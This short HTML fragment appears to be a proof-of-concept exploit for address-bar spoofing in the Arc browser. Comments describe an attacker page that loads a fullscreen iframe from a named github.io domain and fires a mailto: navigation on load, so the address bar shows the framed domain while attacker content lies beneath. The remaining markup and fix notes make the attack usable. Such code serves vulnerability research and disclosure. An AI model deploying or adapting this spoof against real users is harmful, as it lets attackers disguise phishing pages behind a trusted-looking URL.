<!--
  CORRECTED FLOW:
  1. User opens THIS page (domain A / attacker)
  2. victim-frame (domain B / intanjelek.github.io) loads fullscreen
  3. iframe.html on domain B fires mailto: on load
  4. Arc Navigation Delegate reads: origin = domain B (intanjelek.github.io)
  5. Address bar updates to domain B while attacker content (domain A) is underneath

  KEY FIX: Remove the srcdoc attack-frame (wrong origin).
  The trigger must come FROM domain B iframe, not domain A srcdoc.
  So iframe.html on domain B must contain the URI scheme trigger.
-->

<!-- Fullscreen victim iframe (domain B) — THIS is what triggers the spoof -->
<!-- iframe.html on domain B must fire: location.href = 'mailto:a@b.com' on load -->
<iframe
  id="victim-frame"
  src="https://intanjelek.github.io/spoof/iframe.html"
  style="position:fixed;inset:0;width:100%;height:100%;border:none;z-index:9999;"
  sandbox="allow-scripts allow-same-origin allow-top-navigation-by-user-activation allow-forms"
></iframe>

</body>
